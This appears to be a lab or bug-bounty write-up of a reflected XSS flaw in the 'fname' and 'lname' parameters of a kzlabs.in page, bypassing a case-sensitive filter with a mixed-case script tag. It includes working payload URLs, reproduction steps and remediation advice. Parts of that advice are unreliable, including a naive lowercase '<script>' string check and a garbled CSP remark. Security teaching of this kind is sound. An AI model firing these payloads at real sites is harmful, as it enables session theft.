# Reflected Cross-Site Scripting (XSS) - Function Name Filter Evasion

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the `fname` and `lname` parameters of the application.

The application attempts to filter or sanitize user input but can be bypassed using mixed-case variations of HTML tags and JavaScript functions. By injecting a `<ScRiPt>` tag with mixed-case formatting and using the `prompt()` function, arbitrary code execution is achieved despite case-sensitive filtering mechanisms.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering a `prompt(1)` dialog box.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameters

```text
fname
lname
```

## Vulnerable URL

```text
https://kzlabs.in/8.php?fname='>anil&lname='>anil<ScRiPt>prompt(1)</ScRiPt>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the values of the `fname` and `lname` parameters with the following payloads:

   ```text
   fname='>anil
   lname='>anil<ScRiPt>prompt(1)</ScRiPt>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/8.php?fname=%27%3Eanil&lname=%27%3Eanil%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%3E
   ```

4. Observe that the browser executes the injected payload and displays a `prompt(1)` dialog box.

## Payloads Used

```text
fname: '>anil
lname: '>anil<ScRiPt>prompt(1)</ScRiPt>
```

URL-encoded versions:
```text
fname: %27%3Eanil
lname: %27%3Eanil%3CScRiPt%3Eprompt%281%29%3C%2FScRiPt%3E
```

## Proof of Concept

The application accepts the values of the `fname` and `lname` parameters and reflects them directly into the page HTML without proper sanitization. The payload uses mixed-case formatting (`<ScRiPt>`) to bypass case-sensitive filtering mechanisms.

The payload works by:
1. Breaking out of the existing HTML context using `'>`
2. Injecting a `<ScRiPt>` tag with mixed-case formatting to evade case-sensitive filters
3. The browser parses and executes the injected script tag regardless of case
4. The `prompt(1)` function executes, displaying a dialog box

```html
<!-- Injected payload rendered in the page: -->
'><script>prompt(1)</script>
```

HTML is case-insensitive, so `<ScRiPt>`, `<script>`, `<SCRIPT>`, etc., all work the same way. The `prompt()` function is also case-sensitive in JavaScript, but standard function names like `prompt`, `alert`, and `confirm` are all lowercase in typical execution.

<img width="1919" height="616" alt="Screenshot 2026-08-14 185846" src="https://github.com/user-attachments/assets/943f99ca-ecb1-4828-804e-df3099e5504d" />


## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user
- Bypass case-sensitive filtering mechanisms

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($_GET['lname'], ENT_QUOTES, 'UTF-8');
  ```

- **Case-Insensitive Filtering**: If implementing input filtering, ensure it is case-insensitive by converting all input to lowercase or using case-insensitive pattern matching.
  ```php
  $input = strtolower($_GET['lname']);
  if (strpos($input, '<script>') !== false) {
      // Block or sanitize
  }
  ```

- **Input Validation**: Validate and sanitize all user inputs. Consider using a whitelist approach to allow only safe characters.

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes regardless of case.

---
